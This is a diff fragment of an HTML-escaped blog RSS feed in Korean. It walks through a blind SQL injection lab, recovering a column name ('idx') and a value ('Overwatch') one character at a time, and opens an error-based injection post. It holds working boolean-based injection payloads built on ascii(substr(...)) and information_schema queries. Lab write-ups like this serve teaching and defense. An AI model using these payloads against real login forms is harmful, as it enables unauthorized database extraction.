+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="w"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;span class="n"&gt;normaltic&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39; and (ascii(substr((select column_name from information_schema.columns where table_name = &amp;#39;&lt;/span&gt;&lt;span class="n"&gt;game&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39; limit 0,1), 1, 1)) &amp;gt; 97) and &amp;#39;&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39; = &amp;#39;&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="w"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;1번째 Column 이름&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;1번째 글자&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://ansis03.github.io/image/sql_injection/blind/image%2020158.png"
+loading="lazy"
+alt="Fig 20158."
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://ansis03.github.io/image/sql_injection/blind/image%2020159.png"
+loading="lazy"
+alt="Fig 20159."
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://ansis03.github.io/image/sql_injection/blind/image%2020160.png"
+loading="lazy"
+alt="Fig 20160."
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://ansis03.github.io/image/sql_injection/blind/image%2020161.png"
+loading="lazy"
+alt="Fig 20161."
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://ansis03.github.io/image/sql_injection/blind/image%2020162.png"
+loading="lazy"
+alt="Fig 20162."
+&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;1번째 글자는 i&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;2번째 글자&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://ansis03.github.io/image/sql_injection/blind/image%2020163.png"
+loading="lazy"
+alt="Fig 20163."
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://ansis03.github.io/image/sql_injection/blind/image%2020164.png"
+loading="lazy"
+alt="Fig 20164."
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://ansis03.github.io/image/sql_injection/blind/image%2020165.png"
+loading="lazy"
+alt="Fig 20165."
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://ansis03.github.io/image/sql_injection/blind/image%2020166.png"
+loading="lazy"
+alt="Fig 20166."
+&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;2번째 글자는 d&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;3번째 글자&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://ansis03.github.io/image/sql_injection/blind/image%2020167.png"
+loading="lazy"
+alt="Fig 20167."
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://ansis03.github.io/image/sql_injection/blind/image%2020168.png"
+loading="lazy"
+alt="Fig 20168."
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://ansis03.github.io/image/sql_injection/blind/image%2020169.png"
+loading="lazy"
+alt="Fig 20169."
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://ansis03.github.io/image/sql_injection/blind/image%2020170.png"
+loading="lazy"
+alt="Fig 20170."
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://ansis03.github.io/image/sql_injection/blind/image%2020171.png"
+loading="lazy"
+alt="Fig 20171."
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://ansis03.github.io/image/sql_injection/blind/image%2020172.png"
+loading="lazy"
+alt="Fig 20172."
+&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;3번째 글자는 x&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;4번째 글자&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://ansis03.github.io/image/sql_injection/blind/image%2020173.png"
+loading="lazy"
+alt="Fig 20173."
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://ansis03.github.io/image/sql_injection/blind/image%2020174.png"
+loading="lazy"
+alt="Fig 20174."
+&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;4번째는 null 이므로&lt;/p&gt;
+&lt;p&gt;column 이름은 idx&lt;/p&gt;
+&lt;p&gt;name column 안의 값을 찾아보자&lt;/p&gt;
+&lt;h3 id="원하는-데이터-추출"&gt;원하는 데이터 추출
+&lt;/h3&gt;&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-sql" data-lang="sql"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="k"&gt;select&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;name&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;from&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;game&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;limit&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="w"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-sql" data-lang="sql"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;substr&lt;/span&gt;&lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="err"&gt;데이터&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="err"&gt;찾기&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="w"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;span class="n"&gt;ascii&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="err"&gt;문자&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;97&lt;/span&gt;&lt;span class="w"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="w"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;span class="n"&gt;normaltic&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39; and (조건) and &amp;#39;&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39; = &amp;#39;&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="w"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-sql" data-lang="sql"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;substr&lt;/span&gt;&lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="k"&gt;select&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;name&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;from&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;game&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;limit&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="w"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;span class="n"&gt;ascii&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;substr&lt;/span&gt;&lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="k"&gt;select&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;name&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;from&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;game&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;limit&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;97&lt;/span&gt;&lt;span class="w"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="w"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;span class="n"&gt;normaltic&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39; and (ascii(substr((select name from game limit 0, 1), 1, 1)) &amp;gt; 97) and &amp;#39;&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39; = &amp;#39;&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="w"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;1번째 글자 찾기&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://ansis03.github.io/image/sql_injection/blind/image%2020175.png"
+loading="lazy"
+alt="Fig 20175."
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://ansis03.github.io/image/sql_injection/blind/image%2020176.png"
+loading="lazy"
+alt="Fig 20176."
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://ansis03.github.io/image/sql_injection/blind/image%2020177.png"
+loading="lazy"
+alt="Fig 20177."
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://ansis03.github.io/image/sql_injection/blind/image%2020178.png"
+loading="lazy"
+alt="Fig 20178."
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://ansis03.github.io/image/sql_injection/blind/image%2020179.png"
+loading="lazy"
+alt="Fig 20179."
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://ansis03.github.io/image/sql_injection/blind/image%2020180.png"
+loading="lazy"
+alt="Fig 20180."
+&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;1번째 글자는 O&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;2번째 글자 찾기&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://ansis03.github.io/image/sql_injection/blind/image%2020181.png"
+loading="lazy"
+alt="Fig 20181."
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://ansis03.github.io/image/sql_injection/blind/image%2020182.png"
+loading="lazy"
+alt="Fig 20182."
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://ansis03.github.io/image/sql_injection/blind/image%2020183.png"
+loading="lazy"
+alt="Fig 20183."
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://ansis03.github.io/image/sql_injection/blind/image%2020184.png"
+loading="lazy"
+alt="Fig 20184."
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://ansis03.github.io/image/sql_injection/blind/image%2020185.png"
+loading="lazy"
+alt="Fig 20185."
+&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;2번째 글자는 v&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;3번째 글자 찾기&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://ansis03.github.io/image/sql_injection/blind/image%2020186.png"
+loading="lazy"
+alt="Fig 20186."
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://ansis03.github.io/image/sql_injection/blind/image%2020187.png"
+loading="lazy"
+alt="Fig 20187."
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://ansis03.github.io/image/sql_injection/blind/image%2020188.png"
+loading="lazy"
+alt="Fig 20188."
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://ansis03.github.io/image/sql_injection/blind/image%2020189.png"
+loading="lazy"
+alt="Fig 20189."
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://ansis03.github.io/image/sql_injection/blind/image%2020190.png"
+loading="lazy"
+alt="Fig 20190."
+&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;3번째 글자는 e&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;4번째 글자 찾기&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://ansis03.github.io/image/sql_injection/blind/image%2020191.png"
+loading="lazy"
+alt="Fig 20191."
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://ansis03.github.io/image/sql_injection/blind/image%2020192.png"
+loading="lazy"
+alt="Fig 20192."
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://ansis03.github.io/image/sql_injection/blind/image%2020193.png"
+loading="lazy"
+alt="Fig 20193."
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://ansis03.github.io/image/sql_injection/blind/image%2020194.png"
+loading="lazy"
+alt="Fig 20194."
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://ansis03.github.io/image/sql_injection/blind/image%2020195.png"
+loading="lazy"
+alt="Fig 20195."
+&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;4번째 글자는 r&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;5번째 글자 찾기&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://ansis03.github.io/image/sql_injection/blind/image%2020196.png"
+loading="lazy"
+alt="Fig 20196."
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://ansis03.github.io/image/sql_injection/blind/image%2020197.png"
+loading="lazy"
+alt="Fig 20197."
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://ansis03.github.io/image/sql_injection/blind/image%2020198.png"
+loading="lazy"
+alt="Fig 20198."
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://ansis03.github.io/image/sql_injection/blind/image%2020199.png"
+loading="lazy"
+alt="Fig 20199."
+&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;5번째 글자는 w&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;6번째 글자 찾기&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://ansis03.github.io/image/sql_injection/blind/image%2020200.png"
+loading="lazy"
+alt="Fig 20200."
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://ansis03.github.io/image/sql_injection/blind/image%2020201.png"
+loading="lazy"
+alt="Fig 20201."
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://ansis03.github.io/image/sql_injection/blind/image%2020202.png"
+loading="lazy"
+alt="Fig 20202."
+&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;6번째 글자는 a&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;7번째 글자 찾기&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://ansis03.github.io/image/sql_injection/blind/image%2020203.png"
+loading="lazy"
+alt="Fig 20203."
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://ansis03.github.io/image/sql_injection/blind/image%2020204.png"
+loading="lazy"
+alt="Fig 20204."
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://ansis03.github.io/image/sql_injection/blind/image%2020205.png"
+loading="lazy"
+alt="Fig 20205."
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://ansis03.github.io/image/sql_injection/blind/image%2020206.png"
+loading="lazy"
+alt="Fig 20206."
+&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;7번째 글자는 t&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;8번째 글자 찾기&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://ansis03.github.io/image/sql_injection/blind/image%2020207.png"
+loading="lazy"
+alt="Fig 20207."
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://ansis03.github.io/image/sql_injection/blind/image%2020208.png"
+loading="lazy"
+alt="Fig 20208."
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://ansis03.github.io/image/sql_injection/blind/image%2020209.png"
+loading="lazy"
+alt="Fig 20209."
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://ansis03.github.io/image/sql_injection/blind/image%2020210.png"
+loading="lazy"
+alt="Fig 20210."
+&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;8번째 글자는 c&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;9번째 글자 찾기&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://ansis03.github.io/image/sql_injection/blind/image%2020211.png"
+loading="lazy"
+alt="Fig 20211."
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://ansis03.github.io/image/sql_injection/blind/image%2020212.png"
+loading="lazy"
+alt="Fig 20212."
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://ansis03.github.io/image/sql_injection/blind/image%2020213.png"
+loading="lazy"
+alt="Fig 20213."
+&gt;&lt;/p&gt;
+&lt;/li&gt;
 &lt;/ul&gt;
 &lt;hr&gt;
-&lt;h2 id="4-column-이름-찾기"&gt;4. Column 이름 찾기
-&lt;/h2&gt;&lt;p&gt;&lt;code&gt;information_schema.columns&lt;/code&gt;를 이용해 특정 테이블의 컬럼명을 확인한다.&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-sql" data-lang="sql"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;-- game 테이블의 첫 번째 컬럼명 확인
-&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;&lt;/span&gt;&lt;span class="n"&gt;normaltic&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39; and (ascii(substr((select column_name from information_schema.columns where table_name = &amp;#39;&lt;/span&gt;&lt;span class="n"&gt;game&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39; limit 0, 1), 1, 1)) &amp;gt; 97) and &amp;#39;&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39; = &amp;#39;&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="w"&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src="https://ansis03.github.io/image/sql_injection/blind/image%20158.png"
-loading="lazy"
-alt="Fig 158. 컬럼 이름 첫 글자 탐색"
-&gt;&lt;/p&gt;
-&lt;p&gt;탐색 결과, &lt;code&gt;game&lt;/code&gt; 테이블의 첫 번째 컬럼명은 **&lt;code&gt;idx&lt;/code&gt;**이다.&lt;/p&gt;
-&lt;hr&gt;
-&lt;h2 id="5-데이터-추출"&gt;5. 데이터 추출
-&lt;/h2&gt;&lt;p&gt;마지막으로 실제 데이터를 추출한다. &lt;code&gt;game&lt;/code&gt; 테이블의 &lt;code&gt;name&lt;/code&gt; 컬럼 값을 찾는 과정이다.&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-sql" data-lang="sql"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;-- name 컬럼의 첫 번째 데이터 한 글자씩 탐색
-&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;&lt;/span&gt;&lt;span class="n"&gt;normaltic&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39; and (ascii(substr((select name from game limit 0, 1), 1, 1)) &amp;gt; 97) and &amp;#39;&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39; = &amp;#39;&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="w"&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src="https://ansis03.github.io/image/sql_injection/blind/image%20175.png"
-loading="lazy"
-alt="Fig 175. 데이터 추출 시작"
-&gt;&lt;/p&gt;
-&lt;p&gt;모든 자리수를 탐색한 결과, 추출된 데이터는 **&lt;code&gt;Overwatch&lt;/code&gt;**이다.&lt;/p&gt;
-&lt;hr&gt;
-&lt;h2 id="요약"&gt;요약
-&lt;/h2&gt;&lt;p&gt;Blind SQL Injection은 응답의 참/거짓 결과만을 보고 퍼즐을 맞추듯 데이터를 찾아가는 기법이다. 수작업으로는 시간이 매우 오래 걸리므로 파이썬 등을 활용한 자동화 툴을 제작하여 사용하는 것이 일반적이다.&lt;/p&gt;</description></item><item><title>Error Based SQL Injection: ExtractValue와 UpdateXML을 이용한 데이터 추출</title><link>https://ansis03.github.io/posts/sql_injection/error/</link><pubDate>Wed, 03 Dec 2025 00:00:00 +0000</pubDate><guid>https://ansis03.github.io/posts/sql_injection/error/</guid><description>&lt;p&gt;&lt;strong&gt;Error Based SQL Injection&lt;/strong&gt;은 데이터베이스에서 발생하는 에러 메시지에 민감한 정보를 포함시켜 출력하게 함으로써 데이터를 탈취하는 기법이다. 화면에 쿼리 결과가 직접 나오지 않더라도 에러 메시지가 출력되는 환경에서 유효하다.&lt;/p&gt;
+&lt;h2 id="결론"&gt;결론
+&lt;/h2&gt;&lt;p&gt;Blind SQL Injection은 서버가 내뱉는 단 한 줄의 응답 차이를 단서로 삼아 거대한 데이터베이스를 파헤치는 정밀한 공격 기법이다. 비록 수많은 요청과 비교 과정이 필요하여 시간이 오래 걸린다는 단점이 있지만, 정보가 직접 노출되지 않는 &amp;lsquo;눈먼(Blind)&amp;rsquo; 환경에서도 데이터를 탈취할 수 있다는 점에서 매우 위협적이다.&lt;/p&gt;
+&lt;p&gt;따라서 개발 단계에서부터 사용자 입력값에 대한 철저한 검증과 함께, 응답의 미세한 차이를 통해 내부 구조가 유추되지 않도록 보안 설정을 강화해야 한다.&lt;/p&gt;</description></item><item><title>Error Based SQL Injection: ExtractValue와 UpdateXML을 이용한 데이터 추출</title><link>https://ansis03.github.io/posts/sql_injection/error/</link><pubDate>Wed, 03 Dec 2025 00:00:00 +0000</pubDate><guid>https://ansis03.github.io/posts/sql_injection/error/</guid><description>&lt;p&gt;&lt;strong&gt;Error Based SQL Injection&lt;/strong&gt;은 데이터베이스에서 발생하는 에러 메시지에 민감한 정보를 포함시켜 출력하게 함으로써 데이터를 탈취하는 기법이다. 화면에 쿼리 결과가 직접 나오지 않더라도 에러 메시지가 출력되는 환경에서 유효하다.&lt;/p&gt;
 &lt;h3 id="에러의-종류"&gt;에러의 종류
 &lt;/h3&gt;&lt;p&gt;SQL 실행 과정에서 발생하는 에러는 크게 두 가지로 나뉜다.&lt;/p&gt;
 &lt;ol&gt;
